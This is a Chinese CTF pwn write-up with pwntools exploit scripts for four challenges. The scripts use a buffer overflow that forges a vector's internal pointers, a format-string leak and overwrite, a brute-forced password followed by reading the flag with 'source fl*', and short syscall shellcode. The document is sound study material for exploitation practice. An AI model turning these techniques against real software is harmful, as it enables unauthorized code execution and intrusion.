# ezstl

ds说vector内部维护三个指针：`_M_start`（指向数组开头）、`_M_finish`（指向当前最后一个有效元素的下一个位置）和 `_M_end_of_storage`（指向已分配内存的末尾）。调用push_back时，如果`_M_finish != _M_end_of_storage`，就直接在 `_M_finish` 指向的位置构造新元素，然后将 `_M_finish` 指针向后移动一位（增加一个元素大小）；否则执行内存重分配

利用`profile->name`处的bof可以构造一个假vector：`_M_start`随便填一个有效指针，`_M_finish`为`profile+0x48`（`profile->badge`），`_M_end_of_storage`为任意一个大于前者的有效指针
```py
from pwn import *
p=remote("127.0.0.1",54414)
p.recvuntil("profile: ")
profile=int(p.recvline(keepends=True),16)
p.sendafter(": ",b'\x00'*0x30+p64(profile)+p64(profile+0x48)+p64(profile+0x50))
p.recvuntil("win: ")
win=int(p.recvline(keepends=True),16)
p.sendlineafter(": ",str(win))
p.interactive()
```
（我在本地环境下调试时发现`_M_start`必须指向一个 指向可写地址 的指针，否则push_back会报错。但题目的环境没有这个需求）

# 外卖补贴

```py
from pwn import *
context.arch='amd64'
p=remote("127.0.0.1",50926)
def fmt(payload):
    p.sendlineafter("> ",'1')
    p.sendlineafter("line? ",str(len(payload)))
    p.sendafter(": ",payload)
    p.sendlineafter("> ",'2')
fmt("%79$p")
p.recvuntil("preview: ")
base=int(p.recvline(keepends=False),16)-0x151b
fmt(fmtstr_payload(10,{base+0x40b0:base+0x12f7}))
p.sendlineafter("> ",'3')
p.interactive()
```
这里记录一些把我自己气笑的蠢操作

- 我使用的云环境上的libc版本为`2.31`，所以直接运行binary会报错`version 'GLIBC_2.34' not found`
- 尝试安装glibc-all-in-one下载`2.34`的libc，但云环境不能出网
- 打算手动从镜像站下然后传上服务器。结果前三个链接都没有`2.34`，因为这个版本未作为默认版本被任何Ubuntu LTS采用。不过最后一个链接 http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc 是全的
- `dpkg-deb -R x.deb ./libs`解压后找了半天没找到`libc.so.6`,find也没输出
- 原来是我下错了deb包……我下成`libc-bin`开头的了，应该是`libc6`开头的
- ghidra分析代码，存在格式化字符串漏洞和`publish_hook`，“确认”没有后门后打算走one_gadget
- 云环境没有one_gadget，打算gem install。卡了半天突然想起来不能出网
- 本地安装，也卡。`gem sources --remove https://rubygems.org`+`gem sources -a https://mirrors.tuna.tsinghua.edu.cn/rubygems`换个源
- 下完后报错。本地ruby版本太低导致elftools无法运行。算了rop也行
- pwndbg调试找到elf地址和libc地址的偏移，但连接远程时发现服务器的libc地址后缀与本地的不同
- 发呆，思考出题人不提供环境的深意。没有思考出来
- 重新看ghidra，发现一个没见过的函数：director_channel
- ……

# onlyshell

```py
from pwn import *
def attempt(p):
    p.recvuntil(b'password: ')
    p.sendline(b'0')
    return b'wrong' not in p.recvline()
while True:
    p=remote("127.0.0.1",57885)
    if attempt(p):
        p.sendline("source fl*")
        p.interactive()
        exit(0)
    p.close()
```
`enable`可以查看全部的内置命令

我记得我最开始就尝试用source读flag，但报错Permission denied或者别的什么东西。随后我又试了`mapfile x < fl*`然后`declare -p x`。这个方法在我的环境下可以读出flag，但在远程不行，报错“x: not found”，说明mapfile出了问题。想了许久也没想到别的方法，于是又试了一遍source——这次一下就成功了。我记忆出问题了？

# ezpwn03

```py
from pwn import *
context.arch="amd64"
p=remote("127.0.0.1",57969)
shellcode=asm("""xchg eax,esi
mov edi,0x402048
syscall
""")
p.sendafter("> ",shellcode)
p.interactive()
```
xchg和mov只用寄存器的后32位能比用完整的64位省2个字节